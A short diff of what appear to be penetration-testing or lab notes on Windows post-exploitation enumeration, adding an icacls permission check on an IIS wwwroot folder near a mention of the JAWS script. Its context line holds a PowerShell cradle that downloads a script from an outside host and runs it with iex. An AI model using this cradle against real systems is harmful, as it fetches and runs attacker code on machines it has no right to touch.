@@ -4,7 +4,9 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.124:81
 
 Post Exploit Enum Scripts:
 JAWS - Just Another Windows (Enum) Script
-
+```
+\Inetpub>icacls wwwroot
+```
 Usage:
 
 Run from within CMD shell and write out to file.
